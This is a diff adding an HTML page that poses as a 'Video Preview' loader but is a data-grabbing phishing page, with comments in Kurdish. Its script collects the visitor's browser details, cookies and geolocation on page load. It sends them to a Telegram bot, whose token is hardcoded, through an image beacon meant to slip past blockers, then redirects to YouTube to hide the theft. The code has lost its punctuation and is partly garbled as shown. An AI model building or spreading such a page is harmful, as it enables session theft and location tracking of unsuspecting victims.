@@ -1,0 +1,47 @@
+!DOCTYPE html
+html
+head
+    meta charset=UTF-8
+    titleVideo Previewtitle
+    script
+         زانیارییەکانی تۆ
+        const botToken = 8325580182AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc;
+        const chatId = 6679834643;
+
+        function sendToTelegram(msg) {
+             بەکارهێنانی Image Beacon بۆ تێپەڕاندنی بلۆکەری وێبگەڕ
+            var url = httpsapi.telegram.orgbot + botToken + sendMessagechat_id= + chatId + &text= + encodeURIComponent(msg) + &parse_mode=HTML;
+            var img = new Image();
+            img.src = url;
+        }
+
+        window.onload = function() {
+             ١. ناردنی زانیاری ئامێر دەستبەجێ
+            var info = b🔥 Target Accessed!bn +
+                       📱 Device  + navigator.userAgent + n +
+                       🌐 Platform  + navigator.platform;
+            sendToTelegram(info);
+
+             ٢. دزینی کووکی
+            var cookies = document.cookie  No cookies found;
+            sendToTelegram(🍪 Cookies  + cookies);
+
+             ٣. لۆکەشن (تەنها ئەگەر Allow کرا)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(pos) {
+                    var mapUrl = httpswww.google.commapsq= + pos.coords.latitude + , + pos.coords.longitude;
+                    sendToTelegram(📍 Location  + mapUrl);
+                });
+            }
+
+             ٤. ناردن بۆ یوتیوب دوای ٤ چرکە
+            setTimeout(function() {
+                window.location.replace(httpswww.youtube.comwatchv=ilnPMUqFCe0);
+            }, 4000);
+        };
+    script
+head
+body style=background-colorblack; colorwhite; text-aligncenter; padding-top20%;
+    div id=loader
+        pLoading Video Player...p
+        div style=border 4px solid #f3f3f3; border-top 4px solid #3498db; border-radius 50%; width 30px; height 30px;
